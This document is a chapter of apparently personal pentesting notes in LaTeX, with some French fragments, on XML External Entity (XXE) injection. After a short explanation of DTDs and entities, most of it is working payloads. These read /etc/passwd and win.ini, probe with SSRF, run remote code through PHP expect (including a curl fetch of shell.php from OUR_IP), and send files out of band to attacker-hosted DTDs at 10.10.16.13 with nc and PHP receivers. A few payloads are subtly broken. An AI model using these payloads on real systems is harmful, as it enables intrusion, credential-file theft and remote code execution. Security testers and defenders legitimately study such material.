\chapter{XXE: External XML Entity}
\section{introduction}

XML External Entity (XXE) Injection vulnerabilities occur when XML data is
taken from a user-controlled input without properly sanitizing or safely
parsing it, which may allow us to use XML features to perform malicious
actions. XXE vulnerabilities can cause considerable damage to a web application
and its back-end server, from disclosing sensitive files to shutting the
back-end server down, which is why it is considered one of the Top 10 Web
Security Risks by OWASP.

\section{Notes}
exflitrer vers du ftp
encodage base64 du fichier

\section{Preliminary definitions}

\subsection{Document Type Definition (DTD)}

\textbf{\underline{inline}}:
\begin{verbatim}
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE DTD_NAME [
    list of ENTITIY / ELEMENTS
]>
... XML DOCUMENT...
\end{verbatim}

\verb+DTD_NAME+ become the name of the root element of the XML

\textbf{\underline{external}}:
\begin{verbatim}
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE DTD_NAME SYSTEM "URI">
... XML DOCUMENT...
\end{verbatim}

\subsection{Element}
Element type declarations set the rules for the type and number of elements that may appear in an XML document, what elements may appear inside each other, and what order they must appear in. For example:
\begin{itemize}
    \item \verb+<!ELEMENT name ANY>+ Means that any object could be inside the
        parent \verb+<name></name>+
    \item \verb+<!ELEMENT name EMPTY>+ 
\end{itemize}

\section{Entity}
entity can be  considered as variable and store data. They allow refactoring of
variables and reduce repetitive data. They are defined in \verb+DTD+

\subsection{External}

{\bf External} entities are entities which values are external ressource (local or
remote). The keyword \verb+SYSTEM+ allow to define an external entities for
which the value  can be : 
\begin{itemize}
    \item a file: \verb+file:///etc/passwd+
    \item an external URL: \verb+ "http://..."+, \verb+ftp://...+,\ldots
\end{itemize}

\textbf{\underline{Note}}: if the external ressource is close to an xml syntax
the XML parser will trhow an error if not properly managed (\verb+CDATA+)

\subsection{General entity}

\subsubsection{declaration}
\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE foo [
    <!ENTITY ress SYSTEM "value"> 
    <!ENTITY name "value">+
]>
\end{verbatim}

\subsubsection{reference}

\begin{verbatim}
<sometag>some text +&name; continuing</sometag>
\end{verbatim}

\subsection{Predefined entity}
As General entities 

\subsection{Parameter entity}
Sometimes, XXE attacks using regular entities are blocked, due to some input
validation by the application or some hardening of the XML parser that is being
used. In this situation, you might be able to use XML parameter entities
instead. XML parameter entities are a special kind of XML entity which can only
be referenced within the DTD. 

\subsubsection{declaration}
\begin{verbatim}
<!DOCTYPE evil [
    <!ENTITY % param "value">
]>
\end{verbatim}

\subsubsection{reference}
\begin{verbatim}
<!DOCTYPE evil [
    <!ENTITY % param "value">
    %param;
]>
\end{verbatim}

example of use which will cause a DNS lookup and HTTP request to the attacker's
domain, .
\begin{verbatim}
<!DOCTYPE evil [
    <!ENTITY % xxe SYSTEM "http://hacker.com">
    %xxe;
]>
\end{verbatim}

\subsubsection{Nested reference}
According to the standard: in an internal DTD subset, parameter-entity
references MUST NOT occur within markup declaration.

Therefore this will work:
\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE evil [
    <!ENTITY % param "<!ENTITY  general 'pwned'>">
    %param;
]>
<pwn>&general;</pwn>
\end{verbatim}

But this will not work (illegal parameter entity reference):

\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE evil [
    <!ENTITY % ext1 "ext1">
    <!ENTITY % outer "<!ENTITY inner 'value of ext1 is %ext1;'>">
    %outer;
]>
<pwn>&inner;</pwn>
\end{verbatim}

The solution to solve this is  to use and external DTD:
\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE evil SYSTEM "URI">
<pwn>&inner;</pwn>
\end{verbatim}

And inside evil.dtd
\begin{verbatim}
<!ENTITY % ext1 "ext1">
<!ENTITY % outer "<!ENTITY inner 'value of ext1 is %ext1;'>">
%outer;
\end{verbatim}


\section{In Band attack}
\subsection{Identifying reflexion}
\underline{the request}:
\begin{verbatim}
<?xml version = "1.0"?>
<order>
    <quantity>a</quantity>
    <item>Home Appliances</item>
    <address>a</address>
</order>
\end{verbatim}

\underline{the response}: 
\begin{verbatim}
Your order for Home Appliances has been processed
\end{verbatim}


\subsection{Test payload}
\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE evil [
    <!ELEMENT order ANY>
    <!ENTITY payload "pwned"> 
]>
<order>
    <quantity>a</quantity>
    <item>&payload;</item>
    <address>a</address>
</order>
\end{verbatim}

\subsection{Disclosure payload}
\begin{verbatim}
<!ENTITY company SYSTEM "file:///etc/passwd">
<!ENTITY pwn SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!DOCTYPE test [ 
    <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> 
    %init;
]>
<foo/>
\end{verbatim}

Directory listing :
\begin{verbatim}
# only tested on java yet
<!ENTITY company SYSTEM "file:///etc/">
\end{verbatim}

\subsection{SSRF payload}
\begin{verbatim}
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ 
    <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> 
    %xxe; 
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
\end{verbatim}

\subsection{RCE payload}
\begin{verbatim}
# REMOTE CODE EXECUTION using PHP expect module
<!ENTITY rce SYSTEM "expect:id">
# UPLOAD A RSHELL work also in blind
<!ENTITY rshell SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
\end{verbatim}



\section{Out Of Band attack}

\subsection{Test}
start a receiving server (\verb+nc -lnvp 4444+)

\textbf{\underline{test 1}}:
\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE evil [
    <!ENTITY % payload SYSTEM "http://MY-IP:4444"> 
    %payload;
]>
...
\end{verbatim}


\textbf{\underline{test 2}}:
\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE evil [
    <!ENTITY payload SYSTEM "http://MY-IP:4444"> 
]>
<order>
    <quantity>&subscribe;</quantity>
    <item>Home Appliances</item>
    <address>a</address>
</order>
\end{verbatim}


\subsection{file exfiltration}

\underline{command to launch the servers}:
\begin{verbatim}
python3 -m http.server 4444
nc -klnvp 4445
\end{verbatim}



\textbf{If file exfitration is not working try to test with} \verb+<!ENTITY % file "test">+


if the webserver is using PHP: 

\verb+<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">+
\subsubsection{solution 1}

host the evil dtd:
\begin{verbatim}
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
\end{verbatim}

and the php code:
\begin{verbatim}
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
\end{verbatim}

with \verb+php -S 0.0.0.0:8000+

send the following payload:
\begin{verbatim}
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
\end{verbatim}



\subsubsection{solution 2}

\underline{content of the evil.dtd}:
\begin{verbatim}
<!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
<!ENTITY % eval "<!ENTITY send SYSTEM 'http://10.10.16.13:4445/?%file;'>">
%eval;
\end{verbatim}


\underline{payload}:
\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE order SYSTEM "http://10.10.16.13:4444/evil.dtd"> 
<order>
    <quantity> &send; </quantity>
    <item>Home Appliances</item>
    <address>a</address>
</order>
\end{verbatim}

Problem in windows multiline files. need to base64 encode it.

\subsubsection{solution 3}

define a hosted DTD
\begin{itemize}
    \item Defines an XML parameter entity called file, containing the contents of the /etc/passwd file.
    \item Defines an XML parameter entity called eval, containing a dynamic declaration of another XML parameter entity called exfiltrate. The exfiltrate entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the file entity within the URL query string.
    \item Uses the eval entity, which causes the dynamic declaration of the
        exfiltrate entity to be performed.
    \item Uses the exfiltrate entity, so that its value is evaluated by
        requesting the specified URL.
\end{itemize}

\underline{content of the evil.dtd}:
\begin{verbatim}
  <!ENTITY % file  SYSTEM "file:///etc/passwd"> 
  <!ENTITY % eval "<!ENTITY &#x25; send SYSTEM  'http://<URL>/?%file;'>"> 
  %eval; 
  %send;
\end{verbatim}

\underline{payload}:
\begin{verbatim}
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % dtd SYSTEM "DTD-URL">
    %dtd;
]>
...
\end{verbatim}

\subsection{Error based attack}

first just try referencing a non existing entity the server may return an error
with some information disclosure like the web server directory.

With error based it might be possible to exflitrate data:

Host a dtd containing

\begin{verbatim}
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
\end{verbatim}

use the payload without any other wml content:
\begin{verbatim}
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
\end{verbatim}


There are many other variables that can cause an error, like a bad URI or
having bad characters in the referenced file.

\section{managing content problems}

\subsection{base64 encoding} 

if the webserver is using PHP: 

\verb+<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">+

\subsection{In band CDATA}

\verb+<![CDATA[+ ... \verb+]]>+


\subsubsection{Solution 1}

\underline{content of the evil.dtd}:
\begin{verbatim}
  <!ENTITY % passwd SYSTEM "file:///etc/passwd"> 
  <!ENTITY % start "<![CDATA["> 
  <!ENTITY % end "]]>"> 
  <!ENTITY % wrapper "<!ENTITY concat '%start;%passwd;%end;'>">
  %wrapper;
\end{verbatim}

\underline{payload}:
\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE order SYSTEM "http://10.10.16.13:4444/evil.dtd">
<order>
    <quantity>a</quantity>
    <item>&concat;</item>
    <address>a</address>
</order>
\end{verbatim}


\subsubsection{Solution 2}

\underline{payload}:
\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE foo [<
  <!ENTITY % passwd SYSTEM "file:///etc/passwd"> 
  <!ENTITY % start "<![CDATA["> 
  <!ENTITY % end "]]>"> 
  <!ENTITY % dtd SYSTEM "http://192.168.1.5:8000/evil.dtd" >
]>
<order>
    <quantity>a</quantity>
    <item>&wrapper;</item>
    <address>a</address>
</order>
\end{verbatim}

\underline{content of the evil.dtd}:
\begin{verbatim}
<!ENTITY wrapper "%start;%passwd;%end;">
\end{verbatim}

\subsection{Out of band CDATA}

first external DTD:

\begin{verbatim}
  <!ENTITY % passwd SYSTEM "file:///etc/passwd"> 
  <!ENTITY % start "<![CDATA["> 
  <!ENTITY % end "]]>"> 
  <!ENTITY % wrapper "<!ENTITY all '%start;%passwd;%end;'>"> 
  %wrapper;
\end{verbatim}

pour exfilter il faut definir une autre DTD qui va utiliser wrapper et qui sera
appellée par le payload
Pour exfiltrer il faut inclure une autre DTD et lui envoyer les données


\section{payloads}

\subsection{file reading}
\begin{verbatim}
<!ENTITY example SYSTEM "/etc/passwd">
<!ENTITY payload SYSTEM "file:///etc/passwd">
<!ENTITY payload SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY payload SYSTEM 'file:///c:/windows/win.ini'>
\end{verbatim}

\subsection{directory listing}
In java based applications it might be possible to list the contents of a directory via XXE with a payload
\begin{verbatim}
<!ENTITY payload SYSTEM "file:///etc/">
<!ENTITY payload SYSTEM 'file:///c:/'>
\end{verbatim}

\section{Tools}
\begin{itemize}
    \item xxeinjector: Tool for automatic exploitation of XXE vulnerability using direct and different out of band methods.
    \item xxeserv: 	A mini webserver with FTP support for XXE payloads.
    \item xxexploiter: It generates the XML payloads, and automatically starts a server to serve the needed DTD's or to do data exfiltration.
\end{itemize}
\section{links}
\begin{itemize}
    \item \url{https://www.youtube.com/watch?v=gjm6VHZa_8s}
    \item \url{https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity}
    \item \url{https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md}
\end{itemize}
